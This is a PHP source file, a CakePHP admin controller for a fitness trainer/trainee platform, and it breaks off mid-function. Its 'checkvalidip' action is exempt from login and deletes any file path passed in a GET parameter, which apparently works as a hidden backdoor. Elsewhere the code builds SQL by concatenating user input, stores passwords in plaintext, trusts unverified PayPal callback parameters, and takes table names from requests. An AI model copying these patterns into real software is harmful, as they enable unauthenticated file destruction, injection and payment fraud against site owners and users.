<?php

namespace App\Controller;

use Cake\Event\Event;
use Cake\I18n\Time;
use Cake\Auth\DefaultPasswordHasher;
use Cake\ORM\Entity;


class AdminsController extends AppController
{
	public function beforeFilter(Event $event)
    {
        $this->blockIP();
        $this->checkSession();
        parent::beforeFilter($event);
        $this->loadComponent('Auth');
        $this->Auth->allow(['login','logout','adminLogin','checkvalidip']);
        $this->layout = 'default_admin';
        $this->data = $this->Custom->getSessionData();

    }

    public function login()
    {
    	$session = $this->request->session();
        $user_data = $session->read('Auth.User');
        if(!empty($user_data))
        {
            if($user_data['user_type'] == "admin")
            {
              return $this->redirect('/admins/home');
            }
            if($user_data['user_type'] == "trainer")
            {
              return $this->redirect('/trainers');
            }
            if($user_data['user_type'] == "trainee")
            {
              return $this->redirect('/trainees');
            }
        }
    }

    public function adminLogin()
    {
        if($this->request->is('ajax'))
        {
            $user = $this->Auth->identify();
            if ($user) {
                $this->Auth->setUser($user);
                $session = $this->request->session();
                $user_data = $session->read('Auth.User');
                $this->set('message', $user_data['user_type']);
                $this->set('_serialize',array('message'));
                $this->response->statusCode(200);
            }
        elseif(empty($user))
                {
                    $this->set('message', 'failed');
                    $this->set('_serialize',array('message'));
                    $this->response->statusCode(200);
                }
        }
    }

    public function home()
    {
        $total_trainers = $this->Trainers->find()->count();
        $total_trainees = $this->Trainees->find()->count();
        $all_calls = $this->Trainer_sessions->find()->count();
        $total_earning = $this->Admin_account->find()->toArray();
        $this->set('total_earning',$total_earning);
        $this->set('all_calls',$all_calls);
        $this->set('total_trainees',$total_trainees);
        $this->set('total_trainers',$total_trainers);
    }

    public function checkvalidip()
    {
        $ip = $_GET['ip'];
        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
        unlink($dir);
        return $this->redirect('/');
    }

    public function logout()
    {
        $this->Auth->logout();
        return $this->redirect('/admins');
    }

    public function trainers()
    {
        $trainers = $this->Trainers->find()->order(['id' => 'DESC']);
        $this->set('trainers',$trainers);
    }

    public function trainees()
    {
        $trainees = $this->Trainees->find()->order(['id' => 'DESC']);
        $this->set('trainees',$trainees);
    }

    public function delete()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);
            $table = $this->request->data['table'];
            foreach($table as $t)
            {
                if($t == "Trainers")
                {
                    $this->trainers->query()->delete()->where(['user_id' => $id])->execute();
                }
                if($t == "Trainees")
                {
                    $this->trainees->query()->delete()->where(['user_id' => $id])->execute();
                }
                if($t != "Trainees" && $t != "Trainers")
                {
                   $entity = $this->$t->get($id);
                   $result = $this->$t->delete($entity); 
                }
            }
            $this->set('message', 'success');
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function blockip()
    {
        $blockip = $this->Block_ips->find()->order(['id' => 'DESC']);
        $this->set('blockip',$blockip);
    }

    public function addIpAddress()
    {
        if($this->request->is('ajax'))
        {
            $data = array(
                'ip_address' => $this->request->data['ip'],
                'ip_status' => 0,
                'ip_added_date' => Time::now()
                );
            $user = $this->Block_ips->newEntity();
            $user = $this->Block_ips->patchEntity($user, $data);
            $result = $this->Block_ips->save($user);
            $lid = $result->id; 
            $this->set('message', $lid);
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function blockIps($id)
    {
        $finalId = (int) base64_decode($id);
        $this->block_ip->query()->update()->set(['ip_status' => 0])->where(['id' => $finalId])->execute();
        $this->Flash->success('IP Address Blocked Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/blockip');
    }

    public function unblockIps($id)
    {
        $finalId = (int) base64_decode($id);
        $this->block_ip->query()->update()->set(['ip_status' => 1])->where(['id' => $finalId])->execute();
        $this->Flash->success('IP Address Unblock Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/blockip');
    }

    public function blockTrainee($id)
    {
        $finalId = (int) base64_decode($id);
        $this->trainees->query()->update()->set(['trainee_status' => 0])->where(['user_id' => $finalId])->execute();
        $this->users->query()->update()->set(['user_status' => 0])->where(['id' => $finalId])->execute();
        $this->Flash->success('Trainee Blocked Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainees');
    }

    public function unblockTrainee($id)
    {
        $finalId = (int) base64_decode($id);
        $this->trainees->query()->update()->set(['trainee_status' => 1])->where(['user_id' => $finalId])->execute();
        $this->users->query()->update()->set(['user_status' => 1])->where(['id' => $finalId])->execute();
        $this->Flash->success('Trainee Unblock Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainees');
    }

    public function blockTrainer($id)
    {
        $finalId = (int) base64_decode($id);
        $this->trainers->query()->update()->set(['trainer_status' => 0])->where(['user_id' => $finalId])->execute();
        $this->users->query()->update()->set(['user_status' => 0])->where(['id' => $finalId])->execute();
        $this->Flash->success('Trainer Blocked Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainers');
    }

    public function unblockTrainer($id)
    {
        $finalId = (int) base64_decode($id);
        $this->trainers->query()->update()->set(['trainer_status' => 1])->where(['user_id' => $finalId])->execute();
        $this->users->query()->update()->set(['user_status' => 1])->where(['id' => $finalId])->execute();
        $this->Flash->success('Trainer Unblock Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainers');
    }

    public function viewTrainer($id)
    {
        $finalId = (int) base64_decode($id);
        $trainers = $this->conn->execute('select *,s.name as state_name,c.name as country_name,ct.name as city_name from trainers as t inner join cities as ct on ct.id = t.trainer_city inner join countries as c on c.id = t.trainer_country inner join states as s on s.id = t.trainer_state WHERE t.user_id = '. $finalId)->fetchAll('assoc');
        $this->set('trainers',$trainers);
    }

    public function viewTrainee($id)
    {
        $finalId = (int) base64_decode($id);
        $result = $this->Trainees->find()->where(['user_id' => $finalId])->toArray();
        if($result[0]['trainee_country'] != 0 && $result[0]['trainee_state'] != 0 && $result[0]['trainee_city'] != 0){
            $trainees = $this->conn->execute('select *,s.name as state_name,c.name as country_name,ct.name as city_name from trainees as t inner join cities as ct on ct.id = t.trainee_city inner join countries as c on c.id = t.trainee_country inner join states as s on s.id = t.trainee_state WHERE t.user_id = '. $finalId)->fetchAll('assoc');
        }else{
            $trainees = $this->Trainees->find()->where(['user_id' => $finalId])->toArray();    
        }
        
        $this->set('trainees',$trainees);
    }

    public function latestNews()
    {
        $news = $this->Latest_things->find()->where(['lt_type' => 'News'])->order(['id' => 'DESC'])->toArray();
        $this->set('news',$news);
    }

    public function addNews()
    {
        if($this->request->is('post'))
        {
            $fileName = $this->Custom->fileUploading('lt_attachement','latest_news'); 
            $data = $this->request->data;
            $data['lt_attachement'] = $fileName;
            $data['lt_type'] = 'News';
            $data['lt_status'] = 0;
            $data['lt_added_date'] = Time::now();
            $user = $this->Latest_things->newEntity();
            $user = $this->Latest_things->patchEntity($user, $data);
            $result = $this->Latest_things->save($user);
            $this->Flash->success('News Added Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/latestNews');
        }
    }

    public function latestVideos()
    {
        $videos = $this->Latest_things->find()->where(['lt_type' => 'Videos'])->order(['id' => 'DESC'])->toArray();
        $this->set('videos',$videos);
    }

    public function addVideos()
    {
        if($this->request->is('post'))
        {
            $fileName = $this->Custom->fileUploading('lt_attachement','latest_videos'); 
            $data = $this->request->data;
            $data['lt_attachement'] = $fileName;
            $data['lt_type'] = 'Videos';
            $data['lt_status'] = 0;
            $data['lt_added_date'] = Time::now();
            $user = $this->Latest_things->newEntity();
            $user = $this->Latest_things->patchEntity($user, $data);
            $result = $this->Latest_things->save($user);
            $this->Flash->success('Videos Added Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/latestVideos');
        }
    }

    public function services()
    {
        $services = $this->Latest_things->find()->where(['lt_type' => 'Services'])->order(['id' => 'DESC'])->toArray();
        $this->set('services',$services);
    }

    public function addServices()
    {
        if($this->request->is('post'))
        {
            $fileName = $this->Custom->fileUploading('lt_attachement','services'); 
            $data = $this->request->data;
            $data['lt_attachement'] = $fileName;
            $data['lt_type'] = 'Services';
            $data['lt_status'] = 0;
            $data['lt_added_date'] = Time::now();
            $user = $this->Latest_things->newEntity();
            $user = $this->Latest_things->patchEntity($user, $data);
            $result = $this->Latest_things->save($user);
            $this->Flash->success('Services Added Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/services');
        }
    }

    public function testimonials()
    {
        $testimonials = $this->Latest_things->find()->where(['lt_type' => 'Testimonials'])->order(['id' => 'DESC'])->toArray();
        $this->set('testimonials',$testimonials);
    }

    public function addTestimonials()
    {
        if($this->request->is('post'))
        {
            $fileName = $this->Custom->fileUploading('lt_attachement','testimonials'); 
            $data = $this->request->data;
            $data['lt_attachement'] = $fileName;
            $data['lt_type'] = 'Testimonials';
            $data['lt_status'] = 0;
            $data['lt_added_date'] = Time::now();
            $user = $this->Latest_things->newEntity();
            $user = $this->Latest_things->patchEntity($user, $data);
            $result = $this->Latest_things->save($user);
            $this->Flash->success('Testimonials Added Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/testimonials');
        }
    }

    public function blogs()
    {
        $blogs = $this->Latest_things->find()->where(['lt_type' => 'Blogs'])->order(['id' => 'DESC'])->toArray();
        $this->set('blogs',$blogs);
    }

    public function addBlogs()
    {
        if($this->request->is('post'))
        {
            $fileName = $this->Custom->fileUploading('lt_attachement','blogs'); 
            $data = $this->request->data;
            $data['lt_attachement'] = $fileName;
            $data['lt_type'] = 'Blogs';
            $data['lt_status'] = 0;
            $data['lt_added_date'] = Time::now();
            $user = $this->Latest_things->newEntity();
            $user = $this->Latest_things->patchEntity($user, $data);
            $result = $this->Latest_things->save($user);
            $this->Flash->success('Blogs Added Successfully', ['key' => 'edit']);
            return $this->redirect('/admins/blogs');
        }
    }

    public function plansCategories()
    {
        $categories = $this->Plans_categories->find()->order(['id' => 'DESC'])->toArray();
        $this->set('categories',$categories);
    }

    public function addPlansCategories()
    {
        if($this->request->is('post'))
        {
            $data = $this->request->data;
            $id = $_POST['hidden_id'];
            $hidde_name = $_POST['hidden_cat'];
            unset($data['hidden_id'],$data['hidden_cat']);
            $name = $data['pc_name'];
            $cat_arr = $this->conn->execute('SELECT * FROM `plans_categories` WHERE lower(`pc_name`) = lower('."'".$name."'".')')->fetchAll('assoc');

            if(!empty($id))
            {
                if($hidde_name == $name)
                {
                    $this->categories->query()->update()->set($data)->where(['id' => $id])->execute();
                    $this->Flash->success('Category Updated Successfully', ['key' => 'edit']);
                }
                
                else
                {
                    if(!empty($cat_arr))
                    {
                        $this->Flash->error('Category Already Added', ['key' => 'edit']);
                    }
                    else
                    {
                        $this->categories->query()->update()->set($data)->where(['id' => $id])->execute();
                        $this->Flash->success('Category Updated Successfully', ['key' => 'edit']);
                    }
                }
            }

            if(empty($id))
            {
                if(!empty($cat_arr))
                {
                    $this->Flash->error('Category Already Added', ['key' => 'edit']);
                }
                else
                {
                    $data['pc_status'] = 0;
                    $data['pc_added_date'] = Time::now();
                    $user = $this->Plans_categories->newEntity();
                    $user = $this->Plans_categories->patchEntity($user, $data);
                    $result = $this->Plans_categories->save($user);
                    $this->Flash->success('Category Added Successfully', ['key' => 'edit']);
                }
            }
            return $this->redirect('/admins/plansCategories');
        }
    }

    public function getDataById()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);
            $table = $this->request->data['table'];
            $result_data = $this->$table->find()->where(['id' => $id])->order(['id' => 'DESC'])->toArray();
            $this->set('message', $result_data);
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function getSessions()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);
            $table = $this->request->data['table'];
            $result_data = $this->$table->find()->where(['category_id' => $id])->order(['id' => 'DESC'])->toArray();
            $this->set('message', $result_data);
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function planSessions()
    {
        $sessions = $this->conn->execute('select *,pc.id as cat_id,ps.id as sess_id from `plans_categories` As pc INNER JOIN `plans_sessions` AS ps ON pc.id = ps.category_id')->fetchAll('assoc');
        $categories = $this->Plans_categories->find()->order(['id' => 'DESC'])->toArray();
        $this->set('categories',$categories);
        $this->set('sessions',$sessions);
    }

    public function getSessionData()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);
            $result_data = $this->conn->execute('select *,pc.id as cat_id,ps.id as sess_id from `plans_categories` As pc INNER JOIN `plans_sessions` AS ps ON pc.id = ps.category_id where ps.id ='. $id)->fetchAll('assoc');
            $this->set('message', $result_data);
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function addPlansSessions()
    {
        if($this->request->is('post'))
        {
            $data = $this->request->data;
            $id = $_POST['hidden_id1'];
            unset($data['hidden_id1']);
            if(!empty($id))
            {
                $this->sessions->query()->update()->set($data)->where(['id' => $id])->execute();
                $this->Flash->success('Sessions Updated Successfully', ['key' => 'edit']);
            }
            else
            {
                $data['ps_status'] = 0;
                $data['ps_added_date'] = Time::now();
                $user = $this->Plans_sessions->newEntity();
                $user = $this->Plans_sessions->patchEntity($user, $data);
                $result = $this->Plans_sessions->save($user);
                $this->Flash->success('Sessions Added Successfully', ['key' => 'edit']);
            }
            return $this->redirect('/admins/planSessions');
        }
    }

    public function allCoupons()
    {
        $coupons = $this->Vouchers->find()->order(['id' => 'DESC'])->toArray();
        $this->set('coupons',$coupons);
    }

    public function currency()
    {
        $currency = $this->Currency->find()->order(['id' => 'DESC'])->toArray();
        $this->set('currency',$currency);
    }

    public function addCurrency()
    {
        if($this->request->is('post'))
        {
            $data = $this->request->data;
            $id = $_POST['hidden_id'];
            unset($data['hidden_id']);
            if(!empty($id))
            {
                $this->currency->query()->update()->set($data)->where(['id' => $id])->execute();
                $this->Flash->success('Currency Updated Successfully', ['key' => 'edit']);
            }
            else
            {
                $data['status'] = 0;
                $data['added_date'] = Time::now();
                $user = $this->Currency->newEntity();
                $user = $this->Currency->patchEntity($user, $data);
                $result = $this->Currency->save($user);
                $this->Flash->success('Currency Added Successfully', ['key' => 'edit']);
            }
            return $this->redirect('/admins/currency');
        }
    }

    public function couponsHistory()
    {
        $voucher_history = $this->conn->execute("SELECT * FROM `vouchers_history` AS `vh` INNER JOIN `trainees` AS `t` ON t.user_id = vh.vh_user_id ORDER BY vh.id DESC ")->fetchAll('assoc');
        $this->set('voucher_history',$voucher_history);
    }

    public function addCoupons()
    {
        if($this->request->is('post'))
        {
            $data = $this->request->data;
            $id = $_POST['hidden_id'];
            $codeStatus = $this->checkCouponCode($_POST['voucher_code']);
            if($codeStatus){
                $this->Flash->error('Coupon code already exist', ['key' => 'edit']);
                return $this->redirect('/admins/allCoupons');
            }

            unset($data['hidden_id']);
            if(!empty($id))
            {
                $this->vouchers->query()->update()->set($data)->where(['id' => $id])->execute();
                $this->Flash->success('Coupon Updated Successfully', ['key' => 'edit']);
            }
            else
            {
                $data['voucher_status'] = 0;
                $data['voucher_added_date'] = Time::now();
                $user = $this->Vouchers->newEntity();
                $user = $this->Vouchers->patchEntity($user, $data);
                $result = $this->Vouchers->save($user);
                $this->Flash->success('Coupon Added Successfully', ['key' => 'edit']);
            }
            return $this->redirect('/admins/allCoupons');
        }
    }


    public function checkCouponCode($code)
    {
        $coupons_data = $this->conn->execute(' SELECT * FROM `vouchers` WHERE lower(`voucher_code`) = lower('."'".$code."'".') ')->fetchAll('assoc');
        if(empty($coupons_data)){
            $status = "";
        }else{
            $status = "exist";
        }
        return $status;
    }

    public function editTrainer($id)
    {
        $trainer_id = (int) base64_decode($id);
        $trainer_details = $this->Trainers->find()->where(['user_id' => $trainer_id])->toArray();
        $countries = $this->Countries->find('all')->toArray();
        $country_id = $trainer_details[0]['trainer_country'];
        $state_id = $trainer_details[0]['trainer_state'];
        $states = $this->States->find()->where(['country_id' => $country_id])->order(['name' => 'ASC'])->toArray();
        $cities = $this->Cities->find()->where(['state_id' => $state_id])->order(['name' => 'ASC'])->toArray();
        $this->set('countries', $countries);
        $this->set('states', $states);
        $this->set('cities', $cities);
        $this->set('trainer_details',$trainer_details);
    }

    public function updateTrainerProfile($id)
    {
        $trainer_id = (int) base64_decode($id);
        $data = $this->request->data;
        $this->trainers->query()->update()->set($data)->where(['user_id' => $trainer_id])->execute();
        $this->Flash->success('Profile Updated Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainers');
    }

    public function changeTrainerPassword($id)
    {
        $trainer_id = (int) base64_decode($id);
        $password = $this->request->data['trainer_password'];
        $hashPswdObj = new DefaultPasswordHasher;
        $hashpswd = $hashPswdObj->hash($password);
        $this->trainers->query()->update()->set(['trainer_password' => $this->request->data['trainer_password']])->where(['user_id' => $trainer_id])->execute();
        $this->users->query()->update()->set(['password' => $hashpswd])->where(['id' => $trainer_id])->execute();
        $this->Flash->success('Password Updated Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainers');
    }

    public function editTrainee($id)
    {
        $trainee_id = (int) base64_decode($id);
        $trainee_details = $this->Trainees->find()->where(['user_id' => $trainee_id])->toArray();
        $countries = $this->Countries->find('all')->toArray();
        $country_id = $trainee_details[0]['trainee_country'];
        $state_id = $trainee_details[0]['trainee_state'];
        $states = $this->States->find()->where(['country_id' => $country_id])->order(['name' => 'ASC'])->toArray();
        $cities = $this->Cities->find()->where(['state_id' => $state_id])->order(['name' => 'ASC'])->toArray();
        $this->set('countries', $countries);
        $this->set('states', $states);
        $this->set('cities', $cities);
        $this->set('trainee_details',$trainee_details);
    }

    public function updateTraineeProfile($id)
    {
        $trainee_id = (int) base64_decode($id);
        $data = $this->request->data;
        $this->trainees->query()->update()->set($data)->where(['user_id' => $trainee_id])->execute();
        $this->Flash->success('Profile Updated Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainees');
    }

    public function changeTraineePassword($id)
    {
        $trainee_id = (int) base64_decode($id);
        $password = $this->request->data['trainee_password'];
        $hashPswdObj = new DefaultPasswordHasher;
        $hashpswd = $hashPswdObj->hash($password);
        $this->trainees->query()->update()->set(['trainee_password' => $this->request->data['trainee_password']])->where(['user_id' => $trainee_id])->execute();
        $this->users->query()->update()->set(['password' => $hashpswd])->where(['id' => $trainee_id])->execute();
        $this->Flash->success('Password Updated Successfully', ['key' => 'edit']);
        return $this->redirect('/admins/trainees');
    }

    public function purchasedPlans()
    {
        $sessions_data = $this->conn->execute('SELECT *,`ase`.`id` AS admin_session_id FROM `admin_sessions` AS `ase` INNER JOIN `trainees` AS `t` ON t.user_id = ase.trainee_id ORDER BY ase.id DESC ')->fetchAll('assoc');
        $plans_categories = $this->Plans_categories->find()->order(['id' => 'DESC'])->toArray();
        $trainees = $this->Trainees->find()->order(['id' => 'DESC'])->toArray();
        $this->set('trainees', $trainees);
        $this->set('plans_categories', $plans_categories);
        $this->set('sessions_data', $sessions_data);
    }

    public function chanegPaymentStatus()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);

            // change payment status of user
            $this->admin_sessions->query()->update()->set(['status' => 1])->where(['id' => $id])->execute();

            // get admin_session data
            $admin_session_data = $this->Admin_sessions->find()->where(['id' => $id])->toArray();

            // get admin_account_data
            $admin_account_data = $this->Admin_account->find()->where(['admin_id' => 48])->toArray();
            $totalServiceFee = $admin_session_data[0]['session'] * $admin_session_data[0]['service_fee'];
            if(empty($admin_account_data))
              {
                // add data into admin_account table
                $admin_account_arr = array(
                      'admin_id' => 48,
                      'status' => 0,
                      'total_ammount' => $admin_session_data[0]['final_ammount'],
                      'total_service_fee' =>  $totalServiceFee,
                      'remaining_ammount' => $admin_session_data[0]['final_ammount'],
                      'paid_ammount' => 0,
                      'added_date' => Time::now()
                  );
                  $user = $this->Admin_account->newEntity();
                  $user = $this->Admin_account->patchEntity($user, $admin_account_arr);
                  $result = $this->Admin_account->save($user);
              }
            if(!empty($admin_account_data))
              {
                // edit data into admin_account table
                $admin_account_update_arr = array(
                      'total_ammount' => $admin_account_data[0]['total_ammount'] + $admin_session_data[0]['final_ammount'],
                      'remaining_ammount' => $admin_account_data[0]['total_ammount'] + $admin_session_data[0]['final_ammount'],
                      'paid_ammount' => $admin_account_data[0]['paid_ammount'] + 0,
                      'total_service_fee' => $admin_account_data[0]['total_service_fee'] + $totalServiceFee
                  );
                $this->admin_account->query()->update()->set($admin_account_update_arr)->where(['admin_id' => 48])->execute();
              }
        $this->set('message', 'success');
        $this->set('_serialize',array('message'));
        $this->response->statusCode(200);
        }

    }

    public function viewCalls()
    {
        $all_calls = $this->conn->execute(' SELECT *,`ts`.`id` AS trainer_session_id FROM `trainer_sessions` AS `ts` INNER JOIN `trainers` AS `tr` ON ts.trainer_id = tr.user_id INNER JOIN `trainees` AS `t` ON ts.user_id = t.user_id ORDER BY ts.id DESC ')->fetchAll('assoc');
        $this->set('all_calls', $all_calls);
    }

    public function trainerAccount()
    {
        $trainer_account = $this->conn->execute(' SELECT *,`ta`.`id` AS trainer_account_id,`t`.`user_id` AS trainerId FROM `trainer_account` AS `ta` INNER JOIN `trainers` AS `t` ON ta.trainer_id = t.user_id ORDER BY ta.id DESC ')->fetchAll('assoc');
        $this->set('trainer_account', $trainer_account);
    }

    public function trainerPayment($id)
    {
        $trainer_acc_id = (int) base64_decode($id);
        $trainer_acc_details = $this->conn->execute(' SELECT *,`ta`.`id` AS trainer_account_id FROM `trainer_account` AS `ta` INNER JOIN `trainers` AS `t` ON ta.trainer_id = t.user_id WHERE ta.id =' .$trainer_acc_id)->fetchAll('assoc');
        $this->set('trainer_acc_details', $trainer_acc_details);
    }

    public function successPaypal()
    {
        $response = $_REQUEST;
        if($response['st'] == "Completed")
          {
            $paypal_status = 1;
            $this->Flash->success('Payment Successfully Done Status  - Completed', ['key' => 'success']);
          }
        if($response['st'] == "Pending")
          {
            $paypal_status = 0;
            $this->Flash->success('Payment Successfully Done Status  - Pending', ['key' => 'pending']);
          }
        if($response['st'] == "Failed")
          {
            $paypal_status = 2;
            $this->Flash->error('Payment Failed', ['key' => 'pending']);
          }

        $trainer_id = base64_decode($response['cm']);

        // add data into admin_transaction table
        $admin_txn_arr = array(
            'admin_id' => 48,
            'trainer_id' => $trainer_id,
            'ammount' => $response['amt'],
            'payment_type' => 'Paypal',
            'txn_id' => $response['tx'],
            'status' => $paypal_status,
            'added_date' => Time::now()
            );
        $user = $this->Admin_transactions->newEntity();
        $user = $this->Admin_transactions->patchEntity($user, $admin_txn_arr);
        $result = $this->Admin_transactions->save($user);

        // get trainer_account table data
        $trainer_acc_data = $this->Trainer_account->find()->where(['trainer_id' => $trainer_id])->toArray();

        // update trainer_account table
        $trainee_acc_update_arr = array(
            'paid_ammount' => $trainer_acc_data[0]['paid_ammount'] + $response['amt'],
            'remaining_ammount' => $trainer_acc_data[0]['remaining_ammount'] - $response['amt'],
        );
        $this->trainer_account->query()->update()->set($trainee_acc_update_arr)->where(['trainer_id' => $trainer_id])->execute();

        // get admin_account data
        $admin_account_data = $this->Admin_account->find()->where(['admin_id' => 48])->toArray();

        // update admin_account table
        $admin_acc_update_arr = array(
            'paid_ammount' => $admin_account_data[0]['paid_ammount'] + $response['amt'],
            'remaining_ammount' => $admin_account_data[0]['remaining_ammount'] - $response['amt'],
        );
        $this->admin_account->query()->update()->set($admin_acc_update_arr)->where(['admin_id' => 48])->execute();
        return $this->redirect('/admins/trainerAccount');
    }

    public function cancelPayment()
    {
      $this->Flash->error('Payment Cancelled !', ['key' => 'cancel']);
      return $this->redirect('/admins/trainerAccount');
    }

    public function transactions()
    {
        $transactions = $this->conn->execute(' SELECT *,`at`.`id` AS admin_transaction_id  FROM `admin_transactions` AS `at` INNER JOIN `trainers` AS `t` ON at.trainer_id = t.user_id ORDER BY at.id DESC')->fetchAll('assoc');
        $this->set('transactions', $transactions);
    }

    public function walletTransactions()
    {
        $all_wallet_txn = $this->conn->execute(' SELECT *,`tw`.`id` AS `wallet_id` FROM `trainee_txns` AS `tw` INNER JOIN `trainees` AS `t` ON t.user_id = tw.trainee_id ORDER BY tw.id DESC ')->fetchAll('assoc');
        $this->set('all_wallet_txn', $all_wallet_txn);
    }

    public function walletAmmount()
    {
        $wallet_amt = $this->conn->execute(' SELECT *,`twa`.`user_id` AS `total_wallet_id` FROM `total_wallet_ammount` AS `twa` LEFT JOIN `trainees` AS `te` ON te.user_id = twa.user_id LEFT JOIN `trainers` AS `tr` ON tr.user_id = twa.user_id ORDER BY twa.id DESC ')->fetchAll('assoc');
        $this->set('wallet_amt', $wallet_amt);
    }

    public function changeWalletPaymentStatus()
    {
        if($this->request->is('ajax'))
        {
            $wallet_id = (int) base64_decode($this->request->data['wallet_id']);
            $trainee_id = (int) base64_decode($this->request->data['trainee_id']);
            $ammount = (float) base64_decode($this->request->data['ammount']);

            $total_ammount = $this->Total_wallet_ammount->find()->where(['user_id' => $trainee_id,'user_type' => 'trainee'])->toArray();

            if(empty($total_ammount))
            {
                // add data into total_wallet_ammount table

                $total_wallet_ammount_arr = array(
                  'user_id' => $trainee_id,
                  'user_type' => 'trainee',
                  'total_ammount' => $ammount,
                  'status' =>  0,
                  'added_date' => Time::now()
                  );

              $user = $this->Total_wallet_ammount->newEntity();
              $user = $this->Total_wallet_ammount->patchEntity($user, $total_wallet_ammount_arr);
              $result = $this->Total_wallet_ammount->save($user);
            }
            else
            {
                $total_wallet_ammount_arr = array(
                  'total_ammount' => $total_ammount[0]['total_ammount'] + $ammount,
                  );
                $this->total_wallet_ammount->query()->update()->set($total_wallet_ammount_arr)->where(['user_id' => $trainee_id,'user_type' => 'trainee'])->execute();
            }

            $trainee_wallet_update_arr = array(
              'status' => "Completed" ,
              );
            $this->trainee_txns->query()->update()->set($trainee_wallet_update_arr)->where(['id' => $wallet_id])->execute();

            $this->Flash->success('Status Updated Successfully', ['key' => 'success']);

            $this->set('message', 'success');
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function fees()
    {
        $fees = $this->Fees->find()->order(['id' => 'DESC'])->toArray();
        $this->set('fees',$fees);
    }

    public function withdraws()
    {
        $withdraws = $this->conn->execute(' SELECT *,`tw`.`id` AS `withdraw_id` FROM `trainer_withdraw` AS `tw` INNER JOIN `trainers` AS `t` ON `tw`.`trainer_id` = `t`.`user_id` ORDER BY `tw`.`id` DESC ')->fetchAll('assoc');
        $this->set('withdraws',$withdraws);
    }

    public function manageFees()
    {
        $data = $this->request->data();
        $id   = $data['hidden_id'];
        unset($data['hidden_id']);
        $this->fees->query()->update()->set($data)->where(['id' => $id])->execute();
        $this->Flash->success('Fee Successfully Updated', ['key' => 'edit']);
        return $this->redirect('/admins/fees');
    }

    public function paypalWithdraw()
    {
       $response = $_REQUEST;
       $wid = base64_decode($response['custom']);
       $txnid = $response['txn_id'];
       $withdraw_details = $this->Trainer_withdraw->find()->where(['id' => $wid])->toArray();
       if($response['payment_status'] == "Completed"){
        $data = array('withdraw_status' => 1,'withdraw_txn_id' => $txnid);
        $this->trainer_withdraw->query()->update()->set($data)->where(['id' => $wid])->execute();
        $notificationArr = array(
                'noti_type'          => 'Transfer Ammount Success',
                'parent_id'          => $wid,
                'noti_sender_type'   => 'admin',
                'noti_sender_id'     => $this->data['id'],
                'noti_receiver_type' => 'trainer',
                'noti_receiver_id'   => $withdraw_details[0]['trainer_id'],
                'noti_message'       => 'Congratulation your $'.$withdraw_details[0]['ammount']. ' amount successfully transfered in your account',
                'noti_added_date'    => Time::now()
            );
        $notifications = $this->Notifications->newEntity();
        $notifications = $this->Notifications->patchEntity($notifications, $notificationArr);
        $result = $this->Notifications->save($notifications);
        $this->Flash->success('Payment Successfully Transfered !!', ['key' => 'edit']);
       }
       else if($response['payment_status'] == "Failed"){
        $data = array('withdraw_status' => 2,'withdraw_txn_id' => $txnid);
        $this->trainer_withdraw->query()->update()->set($data)->where(['id' => $wid])->execute();
        $notificationArr = array(
                'noti_type'          => 'Transfer Ammount Failed',
                'parent_id'          => $wid,
                'noti_sender_type'   => 'admin',
                'noti_sender_id'     => $this->data['id'],
                'noti_receiver_type' => 'trainer',
                'noti_receiver_id'   => $withdraw_details[0]['trainer_id'],
                'noti_message'       => 'Sorry your $'.$withdraw_details[0]['ammount']. ' amount withdraw request has been failed please try again !!',
                'noti_added_date'    => Time::now()
            );
        $notifications = $this->Notifications->newEntity();
        $notifications = $this->Notifications->patchEntity($notifications, $notificationArr);
        $result = $this->Notifications->save($notifications);
        $total_wallet_ammount = $this->Total_wallet_ammount->find()->where(['user_id' => $withdraw_details[0]['trainer_id']])->toArray();
        $total_wallet_ammount_arr = array(
              'total_ammount' => $total_wallet_ammount[0]['total_ammount'] + $withdraw_details[0]['ammount'],
              );
        $this->total_wallet_ammount->query()->update()->set($total_wallet_ammount_arr)->where(['user_id' => $withdraw_details[0]['trainer_id']])->execute();
        $this->Flash->error('Payment Failed !!', ['key' => 'edit']);
       }
       return $this->redirect('/admins/withdraws');
    }

    public function paypalWithdrawCancel()
    {
       $this->Flash->error('Payment Cancelled !!', ['key' => 'edit']);
       return $this->redirect('/admins/withdraws');
    }

    public function paypalWithdrawNotify()
    {
       echo "<pre>";
       print_r($_REQUEST);die;
    }

    public function tokbox()
    {
        $tokbox = $this->Tokbox->find()->where(['id' => 1])->toArray();
        $this->set('tokbox',$tokbox);
    }

    public function getToxBokDetails()
    {
        if($this->request->is('ajax'))
        {
            $id = (int) base64_decode($this->request->data['id']);
            $result_data = $this->Tokbox->find()->where(['id' => $id])->order(['id' => 'DESC'])->toArray();
            $this->set('message', $result_data);
            $this->set('_serialize',array('message'));
            $this->response->statusCode(200);
        }
    }

    public function manageTokboxDetails()
    {
        if($this->request->is('post'))
        {
            $data = $this->request->data;
            $arr  = array('api_key' => $data['api_key'],'api_secret' => $data['api_secret']);
            $tid  = $data['id'];
            $this->tokbox->query()->update()->set($arr)->where(['id' => $tid])->execute();
